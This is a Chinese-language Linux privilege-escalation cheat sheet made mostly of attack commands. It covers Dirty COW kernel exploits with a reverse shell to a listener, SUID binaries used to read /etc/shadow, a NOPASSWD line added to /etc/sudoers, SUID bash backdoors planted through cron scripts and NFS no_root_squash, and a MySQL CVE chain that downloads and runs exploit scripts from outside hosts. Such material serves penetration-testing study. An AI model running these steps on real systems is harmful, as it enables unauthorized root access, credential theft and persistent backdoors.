## 一、内核漏洞

### 1、简介

```php
	脏牛漏洞（Dirty Cow）是存在时间最长且影响范围最广的漏洞之一。低权限用户可以利用该漏洞实现本地提权，同时可以通过该漏洞实现Docker容器逃逸，获得root权限的shell。
```

### 2、本地内核提权

```php
# 1、检测内核版本
	lsb_release -a	// 查看系统发行版本
	uname -a		// 查看内核版本
```

```php
# 2、下载、编译生成exp文件
	make
```

```php
# 3、执行成功会返回一个root权限的shell
	./dcow -s
```

### 3、DirtyCow漏洞

```php
# 1、进入容器，编译POC并执行
	cd /dirtycow-vdso/
	make
	./0xdeadbeef 192.168.1.100:1234
```

```php
# 2、成功接收到反弹的shell
	nc -lvvp 1234
```

### 3、Linux提权工具

```php
# 下载地址
	https://github.com/mzet-/linux-exploit-suggester.git
```

```php
# 1、根据操作系统版本好自动查找相应提权脚本
	wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

```php
# 2、根据提示下载poc，编译执行
	gcc cve-2017-16995.c -o cve-2017-16995
	./cve-2017-16995
```



## 二、SUID

### 1、简介

```php
	SUID是一种特殊权限，可以让调用者再执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID文件，那么就可以在运行该文件的时候获得root用户权限。
```

### 2、步骤

```php
# 1、在Linux中查找可以用来提权的SUID文件
	find / -perm -u=s -type f 2>/dev/null
```

```php
# 2、通过find以root权限执行命令
	touch pentestlab
	find pentestlab -exec whoami \;
```

### 3、常用命令

```php
# Find
	find pentestlab -exec whoami \;
```

```php
# Vim
	vim.tiny /etc/shadow
```

```php
# awk
	awk 'BEGIN{system("whoami")}'
```

```php
# curl
	curl file:///etc/shadow
```

```php
# Bash
	bash -p
```

```php
# Less
	less /etc/passwd
```

```php
# Nmap
	nmap --interactive
```



## 三、sudo

### 1、简介

```php
	普通用户在使用sudo执行命令的过程中，会以root方式执行命令。在很多场景中，管理员为了运维管理方便，sudoer配置文件错误导致提权。
```

### 2、步骤

```php
# 1、设置sudo免密码
	vi /etc/sudoers
	在最后一行添加：bypass ALL=(ALL:ALL) NOPASSWD:ALL
```

```php
# 2、查看sudo的权限
	sudo -l
	more /etc/shadow
	sudo more /etc/shadow
```



## 四、计划任务

### 1、简介

```php
	如果可以找到可以有权限修改的计划任务脚本，就可以修改脚本实现提权。本质上，就是文件权限配置不当。
```

### 2、步骤

```php
# 1、查看计划任务，找到有修改权限的计划任务脚本
	ls -l /etc/cron*
	more /etc/crontab
```

```php
# 2、在存在计划的文件mysqlback.sh，添加SUID shell后门，当定时任务以root再次执行时，可以获取root权限
	cp /bin/bash /tmp/shell
	chmod u+s /tmp/shell
```



## 五、NFS

### 1、简介

```
	当服务器中存在NFS共享，开启no_root_squash选项时，如果客户端使用的是root用户，那么对于共享目录来说，该客户端就有root权限，可以使用它来提升权限。
```

### 2、步骤

```php
# 1、查看NFS服务器上的共享目录
	sudo showmount -e 192.168.1.100
```

```php
# 2、创建本地挂载目录，挂载共享目录。使用攻击者本地root权限创建Suid shell
	sudo mkdir -p /tmp/data
	sudo mount -t nfs 192.168.1.100:/home/bypass /tmp/data
	cp /bin/bash /tmp/data/shell
	chmod u+s /tmp/data/shell
```

```php
# 3、回到要提权的服务器上，使用普通用户使用-p参数来获取root权限
```



## 六、Mysql

### 1、简介

```php
	Mysql提权方式有UDF提权，MOF提权，写入启动项提权等方式。CVE-2016-6663和CVE-2016-6664组合利用，可以将一个www-data权限提升到root权限。
```

### 2、步骤

```php
# 1、利用CVE-2016-6663将www-data权限提升为Mysql权限
	cd /var/www/html
	gcc mysql-privesc-race.c -o mysql-privesc-race -I /usr/include/mysql -l mysqlclient
	./mysql-privesc-race test 123456 localhost testdb
```

```php
# 2、利用CVE-2016-6664将Mysql权限提升为root权限
	wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh
	chmod 777 mysql-chowned.sh
	./mysql-chowned.sh /var/log/mysql/error.log
```

